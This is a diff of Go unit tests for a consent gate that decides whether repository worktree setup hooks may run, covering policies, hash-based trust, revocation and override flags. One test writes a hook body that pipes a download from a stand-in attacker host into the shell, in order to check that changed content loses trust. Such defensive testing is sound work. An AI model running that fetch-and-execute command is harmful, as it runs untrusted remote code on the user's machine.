@@ -2,6 +2,7 @@ package git
 
 import (
 	"bytes"
+	"errors"
 	"os"
 	"path/filepath"
 	"strings"
@@ -54,13 +55,32 @@ func TestParseScriptConsentPolicy(t *testing.T) {
 	}
 }
 
-func TestCheckScriptConsent_NeverPolicy_BlocksEvenIfPreviouslyTrusted(t *testing.T) {
-	repoDir := t.TempDir()
-	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
-	hash, err := hashScriptFile(scriptPath)
+// mustIdentity inspects repoDir's hook of the given kind, failing the test
+// if it is missing or unreadable.
+func mustIdentity(t *testing.T, repoDir, kind string) *WorktreeScriptIdentity {
+	t.Helper()
+	id, err := InspectWorktreeScript(repoDir, kind)
 	if err != nil {
 		t.Fatal(err)
 	}
+	if id == nil {
+		t.Fatalf("no %s hook found under %s", kind, repoDir)
+	}
+	return id
+}
+
+func trustStatus(t *testing.T, repoDir, kind string) ScriptTrustStatus {
+	t.Helper()
+	status, err := WorktreeScriptTrustStatus(mustIdentity(t, repoDir, kind))
+	if err != nil {
+		t.Fatal(err)
+	}
+	return status
+}
+
+func TestCheckScriptConsent_NeverPolicy_BlocksEvenIfPreviouslyTrusted(t *testing.T) {
+	repoDir := t.TempDir()
+	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
 	// Pre-trust it, to prove "never" still wins even over stored trust.
 	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
@@ -69,77 +89,97 @@ func TestCheckScriptConsent_NeverPolicy_BlocksEvenIfPreviouslyTrusted(t *testing
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})
 
-	err = checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{})
+	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
 	if err == nil {
 		t.Fatal("expected ScriptConsentNever to block execution, got nil error")
 	}
 	if !strings.Contains(err.Error(), "never") {
 		t.Errorf("expected error to mention the never policy, got: %v", err)
 	}
+	if !errors.Is(err, ErrWorktreeScriptNotApproved) {
+		t.Errorf("expected a skip (ErrWorktreeScriptNotApproved), got: %v", err)
+	}
 }
 
 func TestCheckScriptConsent_AlwaysPolicy_AllowsWithoutStore(t *testing.T) {
 	repoDir := t.TempDir()
-	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
-	hash, err := hashScriptFile(scriptPath)
-	if err != nil {
-		t.Fatal(err)
-	}
+	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})
 
-	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{}); err != nil {
+	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{}); err != nil {
 		t.Fatalf("expected ScriptConsentAlways to allow unconditionally, got: %v", err)
 	}
 }
 
-func TestCheckScriptConsent_PromptPolicy_NonInteractive_FailsClosedWithRemediation(t *testing.T) {
+// TestCheckScriptConsent_PromptPolicy_NonInteractive_SkipsWithOneLineNotice
+// pins the CLI skip notice: one line naming the approve command for this
+// repo and hook, the short hash, the interpreter and --run-hooks.
+func TestCheckScriptConsent_PromptPolicy_NonInteractive_SkipsWithOneLineNotice(t *testing.T) {
 	repoDir := t.TempDir()
-	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
-	hash, err := hashScriptFile(scriptPath)
-	if err != nil {
-		t.Fatal(err)
-	}
+	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})
 
 	// go test's stdin/stdout are not a TTY, so this exercises the
 	// non-interactive path deterministically: never hang, never auto-run.
-	err = checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{})
+	id := mustIdentity(t, repoDir, "setup")
+	err := checkScriptConsent(id, &bytes.Buffer{})
 	if err == nil {
-		t.Fatal("expected an unrecognized script under \"prompt\" with no TTY to be denied")
+		t.Fatal("expected an unrecognized script under \"prompt\" with no TTY to be skipped")
 	}
-	if !strings.Contains(err.Error(), "trust-scripts") {
-		t.Errorf("expected remediation pointing at `agent-deck worktree trust-scripts`, got: %v", err)
+	if !errors.Is(err, ErrWorktreeScriptNotApproved) {
+		t.Errorf("expected ErrWorktreeScriptNotApproved, got: %v", err)
+	}
+	msg := err.Error()
+	for _, want := range []string{
+		"agent-deck worktree trust-hooks " + id.RepoRoot + " --hook setup",
+		"--run-hooks",
+		id.ShortHash(),
+		ScriptInterpreterShell,
+		"not approved yet",
+	} {
+		if !strings.Contains(msg, want) {
+			t.Errorf("notice missing %q: %s", want, msg)
+		}
+	}
+	if strings.Contains(msg, "\n") {
+		t.Errorf("notice must be one line, got: %q", msg)
 	}
 }
 
 func TestCheckScriptConsent_PromptPolicy_AllowOverride_AllowsButDoesNotPersist(t *testing.T) {
 	repoDir := t.TempDir()
-	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
-	hash, err := hashScriptFile(scriptPath)
-	if err != nil {
-		t.Fatal(err)
-	}
+	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowOverride: true})
 
+	id := mustIdentity(t, repoDir, "setup")
 	var out bytes.Buffer
-	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &out); err != nil {
-		t.Fatalf("expected --allow-repo-scripts override to allow, got: %v", err)
+	if err := checkScriptConsent(id, &out); err != nil {
+		t.Fatalf("expected --run-hooks override to allow, got: %v", err)
 	}
-	if !strings.Contains(out.String(), "warning") {
-		t.Errorf("expected an override warning to be printed, got: %q", out.String())
+	if !strings.Contains(out.String(), "--run-hooks") || !strings.Contains(out.String(), id.SHA256) {
+		t.Errorf("expected the override notice to name --run-hooks and the full sha256, got: %q", out.String())
 	}
 
 	// The override is one-shot: it must not have written a trust record.
-	repoRootAbs, _ := filepath.Abs(repoDir)
-	trusted, lookupErr := lookupScriptConsent(repoRootAbs, "setup", hash)
-	if lookupErr != nil {
-		t.Fatal(lookupErr)
+	if got := trustStatus(t, repoDir, "setup"); got != ScriptUntrusted {
+		t.Errorf("expected --run-hooks to NOT persist trust, status = %v", got)
 	}
-	if trusted {
-		t.Error("expected --allow-repo-scripts to NOT persist trust, but a matching entry was found")
+}
+
+func TestCheckScriptConsent_PromptPolicy_AllowOverrideWithTrust_Persists(t *testing.T) {
+	repoDir := t.TempDir()
+	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
+
+	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowOverride: true, PersistOverride: true})
+
+	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{}); err != nil {
+		t.Fatal(err)
+	}
+	if got := trustStatus(t, repoDir, "setup"); got != ScriptTrusted {
+		t.Errorf("expected --run-hooks --trust to record trust, status = %v", got)
 	}
 }
 
@@ -147,15 +187,18 @@ func TestCheckScriptConsent_PromptPolicy_PreTrustedContent_AllowsSilently(t *tes
 	repoDir := t.TempDir()
 	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
-	hash, err := TrustScript(repoDir, "setup", scriptPath)
-	if err != nil {
+	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
 		t.Fatal(err)
 	}
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})
 
-	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{}); err != nil {
-		t.Fatalf("expected a pre-trusted hash to be allowed without a prompt, got: %v", err)
+	var out bytes.Buffer
+	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &out); err != nil {
+		t.Fatalf("expected a pre-trusted identity to be allowed without a prompt, got: %v", err)
+	}
+	if out.Len() != 0 {
+		t.Errorf("expected no output for a trusted hook, got %q", out.String())
 	}
 }
 
@@ -171,16 +214,18 @@ func TestCheckScriptConsent_PromptPolicy_ContentChanged_RequiresReconsent(t *tes
 	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	newHash, err := hashScriptFile(scriptPath)
-	if err != nil {
-		t.Fatal(err)
-	}
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})
 
-	err = checkScriptConsent("setup", repoDir, scriptPath, newHash, &bytes.Buffer{})
+	if got := trustStatus(t, repoDir, "setup"); got != ScriptChanged {
+		t.Errorf("status after content change = %v, want ScriptChanged", got)
+	}
+	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
 	if err == nil {
 		t.Fatal("expected changed script content to invalidate prior trust and require re-consent")
+	}
+	if !strings.Contains(err.Error(), "changed since it was approved") {
+		t.Errorf("expected the notice to say the hook changed, got: %v", err)
 	}
 }
 
@@ -188,14 +233,11 @@ func TestRevokeScriptConsent(t *testing.T) {
 	repoDir := t.TempDir()
 	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
-	hash, err := TrustScript(repoDir, "setup", scriptPath)
-	if err != nil {
+	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
 		t.Fatal(err)
 	}
-	repoRootAbs, _ := filepath.Abs(repoDir)
-	trusted, err := lookupScriptConsent(repoRootAbs, "setup", hash)
-	if err != nil || !trusted {
-		t.Fatalf("expected freshly trusted script to be trusted, trusted=%v err=%v", trusted, err)
+	if got := trustStatus(t, repoDir, "setup"); got != ScriptTrusted {
+		t.Fatalf("expected freshly trusted script to be trusted, status = %v", got)
 	}
 
 	existed, err := RevokeScriptConsent(repoDir, "setup")
@@ -216,12 +258,8 @@ func TestRevokeScriptConsent(t *testing.T) {
 	if existedAgain {
 		t.Error("expected second revoke of the same entry to report nothing existed")
 	}
-	trusted, err = lookupScriptConsent(repoRootAbs, "setup", hash)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if trusted {
-		t.Error("expected revoked script to no longer be trusted")
+	if got := trustStatus(t, repoDir, "setup"); got != ScriptUntrusted {
+		t.Errorf("expected revoked script to no longer be trusted, status = %v", got)
 	}
 }
 
@@ -289,10 +327,12 @@ func TestGateAndRunWorktreeSetupScript_AlwaysPolicy_Runs(t *testing.T) {
 // (and stealing keystrokes) or blocking a remote HTTP handler on an
 // operator's terminal nobody is watching.
 func TestPromptScriptConsent_AllowPromptFalse_NeverAsks(t *testing.T) {
+	simulateTerminal(t, "a\n")
 	var out bytes.Buffer
-	approved, interactive := promptScriptConsent("setup", "/some/repo", "/some/repo/.agent-deck/worktree-setup.sh", &out, false)
-	if approved || interactive {
-		t.Errorf("expected allowPrompt=false to short-circuit to (approved=false, interactive=false), got approved=%v interactive=%v", approved, interactive)
+	id := WorktreeScriptIdentity{Kind: "setup", RepoRoot: "/some/repo", ScriptPath: "/some/repo/.agent-deck/worktree-setup.sh"}
+	decision, interactive := promptScriptConsent(id, ScriptUntrusted, &out, false)
+	if decision != ScriptConsentSkip || interactive {
+		t.Errorf("expected allowPrompt=false to short-circuit to (skip, interactive=false), got decision=%v interactive=%v", decision, interactive)
 	}
 	if out.Len() != 0 {
 		t.Errorf("expected no prompt text written when allowPrompt=false, got: %q", out.String())
@@ -305,21 +345,18 @@ func TestPromptScriptConsent_AllowPromptFalse_NeverAsks(t *testing.T) {
 // forced false must fail closed with the same remediation message as the
 // no-TTY case, never silently run and never block.
 func TestCheckScriptConsent_PromptPolicy_InteractivePromptDisallowed_FailsClosed(t *testing.T) {
+	simulateTerminal(t, "a\n")
 	repoDir := t.TempDir()
-	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
-	hash, err := hashScriptFile(scriptPath)
-	if err != nil {
-		t.Fatal(err)
-	}
+	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
 
 	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowInteractivePrompt: false})
 
-	err = checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{})
+	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
 	if err == nil {
 		t.Fatal("expected AllowInteractivePrompt=false to deny an unrecognized script even if stdio happened to be a terminal")
 	}
-	if !strings.Contains(err.Error(), "trust-scripts") {
-		t.Errorf("expected remediation pointing at `agent-deck worktree trust-scripts`, got: %v", err)
+	if !strings.Contains(err.Error(), "trust-hooks") {
+		t.Errorf("expected remediation pointing at `agent-deck worktree trust-hooks`, got: %v", err)
 	}
 }
 
